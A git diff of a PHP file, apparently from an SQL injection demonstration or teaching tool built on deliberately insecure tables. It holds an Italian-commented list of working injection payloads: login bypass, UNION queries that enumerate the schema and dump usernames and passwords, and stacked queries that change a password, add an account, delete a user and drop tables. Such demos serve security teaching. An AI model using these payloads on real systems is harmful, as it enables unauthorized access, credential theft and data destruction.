@@ -18,14 +18,14 @@ $manual_mode = false;
 
 $payloads = [
     ["' OR 1=1; --", "Classico Attacco SQL Injection"], // siccome ritorna sempre True e toglie la password prende tutta la tabella del login
-    ["admin' -- ", "Esegue l'accesso dell'admin senza la password"], // fa l'accesso dell'admin senza la password
     ["' UNION SELECT NULL, GROUP_CONCAT(table_name), NULL FROM information_schema.tables WHERE table_schema = DATABASE()-- -", "Stampa le tabelle del database"], // per conoscere le varie tabelle
     ["' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='unsecure_users' AND table_schema=DATABASE()-- -", "Stampa le colonne della tabella users"], // per conoscere la tabella users
     ["' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='unsecure_contacts' AND table_schema=DATABASE()-- -", "Stampa le colonne della tabella contacts"], // per conoscere la tabella contacts
     ["' UNION SELECT id, username, password FROM unsecure_users-- -", "Stampa la tabella users"], // stampa la tabella users
     ["' UNION SELECT user_id, telefono, email FROM unsecure_contacts-- -", "Stampa la tabella contacts"], // stampa la tabella contacts
-    ["'; UPDATE unsecure_users SET password='123456' WHERE username='anna.neri'; SELECT * FROM unsecure_users; -- ", "Cambia la password di 'anna.neri' in '123456'"], // cambia password ad un utente
-    ["'; INSERT INTO unsecure_users (username, password) VALUES ('testuser', 'test1234!'); SELECT * FROM unsecure_users; --", "Inserisce un nuovo utente 'testuser' con password 'test1234!'"], // inserisce un nuovo utente
+    ["admin' -- ", "Esegue l'accesso dell'admin senza la password"], // fa l'accesso dell'admin senza la password
+    ["'; UPDATE unsecure_users SET password='123456' WHERE username='anna.neri'; SELECT * FROM unsecure_users WHERE username='anna.neri'; -- ", "Cambia la password di 'anna.neri' in '123456'"], // cambia password ad un utente
+    ["'; INSERT INTO unsecure_users (username, password) VALUES ('testuser', 'test1234!'); SELECT * FROM unsecure_users WHERE username='testuser'; --", "Inserisce un nuovo utente 'testuser' con password 'test1234!'"], // inserisce un nuovo utente
     ["'; DELETE FROM unsecure_users WHERE username='mario.rossi'; SELECT * FROM unsecure_users; --", "Elimina l'utente 'mario.rossi'"], // elimina un utente
     ["'; DROP TABLE unsecure_contacts; DROP TABLE unsecure_users; --", "Elimina la tabella users e contacts"], // elimina l'intera tabella users
     ["' OR 1=1; --", "Controllo del DROP TABLE"]
